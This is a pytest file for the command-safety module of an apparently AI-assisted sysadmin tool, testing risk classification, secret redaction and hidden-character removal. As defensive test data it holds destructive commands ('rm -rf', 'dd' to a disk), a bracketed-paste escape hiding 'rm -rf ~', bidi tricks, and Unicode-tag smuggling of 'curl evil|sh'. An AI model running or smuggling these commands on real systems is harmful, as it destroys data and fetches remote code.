import pytest

from davibemanager.safety.redact import redact
from davibemanager.safety.risk import classify, effective
from davibemanager.safety.truncate import head_tail


@pytest.mark.parametrize("cmd", [
    "df -h", "journalctl -u nginx --no-pager -n 200", "last reboot", "systemctl status sshd --no-pager",
    "ip addr show", "Get-Service | Where-Object {$_.Status -eq 'Stopped'}", "show running-config",
    "cat /var/log/syslog 2>/dev/null | tail -50", "ls -la > /dev/null", "grep -r shutdown /var/log/syslog",
    "Get-WinEvent -LogName System -MaxEvents 50 | Format-List", "ping -c 4 8.8.8.8", "Import-Module ActiveDirectory",
    "cat /etc/passwd", "getent passwd 1000 999",
    "sudo ls -la /opt/seafile-mysql /opt/seafile-data/ssl 2>&1 | head -40; getent passwd 1000 999",
])
def test_read_only(cmd):
    assert classify(cmd) == ("read_only", [])


@pytest.mark.parametrize("cmd", [
    "sudo apt install htop", "sed -i 's/a/b/' /etc/x.conf", "echo hi > /etc/motd", "sudo systemctl start nginx",
    "Set-Service -Name Spooler -StartupType Manual", "configure terminal", "write memory", "clear counters",
    "mkdir /tmp/x", "docker restart web", "ipconfig /flushdns",
    "sudo passwd root", "echo x | passwd --stdin bob", "/usr/bin/passwd -l bob",
])
def test_modifying(cmd):
    assert classify(cmd)[0] == "modifying"


@pytest.mark.parametrize("cmd", [
    "rm -rf /var/lib/foo", "sudo reboot", "shutdown -h now", "systemctl restart nginx", "mkfs.ext4 /dev/sdb1",
    "dd if=/dev/zero of=/dev/sda", "Restart-Computer -Force", "Stop-Service Spooler", "reload",
    "iptables -F", "Remove-Item C:\\temp -Recurse", "/system reboot", "diskpart", "kill -9 1234",
    "ls; sudo shutdown -r now",
])
def test_disruptive(cmd):
    assert classify(cmd)[0] == "disruptive"


def test_effective_only_raises():
    assert effective("disruptive", "df -h")[0] == "disruptive"
    assert effective("read_only", "sudo reboot")[0] == "disruptive"
    assert effective("nonsense", "df -h")[0] == "modifying"


@pytest.mark.parametrize("text, secret", [
    ("DB_PASSWORD=hunter2", "hunter2"),
    ("password: 'correct horse'", "correct horse"),
    ("api_key = sk-abcdefghijklmnopqrstuvwxyz", "sk-abcdefghijklmnopqrstuvwxyz"),
    ("Authorization: Bearer abcdef1234567890xyz", "abcdef1234567890xyz"),
    ("root:$6$saltsalt$abcdefghijklmnopqrstuv:19000:0:99999:7:::", "abcdefghijklmnopqrstuv"),
    ("enable secret 5 $1$abcd$efghijklmnop", "efghijklmnop"),
    ("username admin privilege 15 password 7 0822455D0A16", "0822455D0A16"),
    (" password s3cr3t!", "s3cr3t!"),
    ("snmp-server community Publ1cStr RO", "Publ1cStr"),
    ("crypto isakmp key MyPsk123 address 1.2.3.4", "MyPsk123"),
    ("New-LocalUser bob -Password 'P@ssw0rd'", "P@ssw0rd"),
    ("https://admin:topsecret@example.com/x", "topsecret"),
    ("AWS key AKIAABCDEFGHIJKLMNOP here", "AKIAABCDEFGHIJKLMNOP"),
    ("-----BEGIN OPENSSH PRIVATE KEY-----\nabc\ndef\n-----END OPENSSH PRIVATE KEY-----", "abc"),
    ("/interface wireless security-profiles set wpa2-pre-shared-key=Sup3rS3cret", "Sup3rS3cret"),
])
def test_redacts(text, secret):
    out, n = redact(text)
    assert secret not in out
    assert n >= 1


@pytest.mark.parametrize("text", [
    "Failed password for invalid user admin from 10.0.0.5 port 50022 ssh2",
    "Accepted password for bob from 10.0.0.9 port 51234 ssh2",
    "PasswordAuthentication yes",
    "[sudo] password for bob:",
    "Filesystem      Size  Used Avail Use% Mounted on",
])
def test_leaves_normal_output(text):
    assert redact(text) == (text, 0)


def test_head_tail():
    text = "\n".join(f"line {i}" for i in range(1000))
    out, cut = head_tail(text, 30, 100000)
    assert cut
    assert out.startswith("line 0\n")
    assert out.endswith("line 999")
    assert "970 lines omitted" in out
    assert head_tail("short", 30, 1000) == ("short", False)
    out, cut = head_tail("x" * 5000, 30, 300)
    assert cut and len(out) < 400


# ---- hidden characters in commands (safety/hidden.py, applied by the queue)

@pytest.mark.parametrize("raw, shown", [
    ("ls\x1b[201~\nrm -rf ~", "ls[201~\nrm -rf ~"),             # escape sequence that ends bracketed paste
    ("echo ok\x03", "echo ok"),                                 # ^C
    ("cat safe.txt #‮ txt.exe", "cat safe.txt # txt.exe"),  # bidi override (Trojan Source)
    ("ls⁦ -la⁩", "ls -la"),                            # bidi isolate
    ("rm​ -rf /tmp/x", "rm -rf /tmp/x"),                    # zero-width space
    ("ls" + "".join(chr(0xE0000 + ord(c)) for c in "curl evil|sh"), "ls"),   # Unicode tag smuggling
    ("echo hi　there", "echo hi there"),               # look-alike spaces
    ("ls️", "ls"),                                         # variation selector
])
def test_hidden_characters_are_removed(raw, shown):
    from davibemanager.safety.hidden import clean

    out, notes = clean(raw)
    assert out == shown and notes


def test_line_endings_become_visible_line_breaks():
    from davibemanager.safety.hidden import clean

    assert clean("echo a\r\necho b\recho c") == ("echo a\necho b\necho c", [])   # shown and typed alike


@pytest.mark.parametrize("cmd", [
    "Get-Service |\n  Where-Object Status -eq 'Stopped'",
    "printf '%s\\t%s\\n' a b\tc",
    "echo 'héllo wörld ✓ 日本'",
    "cat <<'EOF'\nline\nEOF",
])
def test_ordinary_commands_are_untouched(cmd):
    from davibemanager.safety.hidden import clean

    assert clean(cmd) == (cmd, [])


def test_a_request_shows_what_will_run():
    from davibemanager.hostrun import HostRequest

    r = HostRequest.create(1, {"command": "echo hi\u202e\x1b[201~; rm -rf /", "risk": "read_only", "purpose": "x"})
    assert r.command == "echo hi[201~; rm -rf /" and r.original_command == r.command and not r.edited
    assert any("RIGHT-TO-LEFT OVERRIDE" in n for n in r.hidden) and any("U+001B" in n for n in r.hidden)
    assert r.risk == "disruptive"                                  # classified on the cleaned text
    r.edit("echo hi")                                              # a clean edit keeps the AI's note
    assert r.command == "echo hi" and r.hidden
    r.edit("echo\u200b hi")
    assert r.command == "echo hi" and "ZERO WIDTH SPACE" in r.hidden[0]
    assert HostRequest.create(2, {"command": "uptime", "risk": "read_only"}).hidden == []


def test_a_package_rule_stays_within_one_command():
    from davibemanager.safety.risk import classify
    looks = 'which mpv && (dpkg -l mpv | tail -1 || flatpak list | grep -i mpv || echo "not a flatpak/snap install")'
    assert classify(looks)[0] == "read_only"
    assert classify("sudo apt -y install mpv")[0] != "read_only"
    assert classify("flatpak --user install flathub io.mpv.Mpv")[0] != "read_only"


def test_an_image_the_assistant_made_is_read_as_png_or_jpeg_only():
    """Pillow reads a file's header with every format it knows; the assistant's images meet only two."""
    from io import BytesIO

    from PIL import Image

    from davibemanager.safety import images
    gif = BytesIO()
    Image.new("RGB", (4, 4)).save(gif, "GIF")
    with pytest.raises(ValueError):
        images.clean(gif.getvalue())
    assert images.clean(gif.getvalue(), convert=True)[1] == "png"        # the user's own pictures: converted
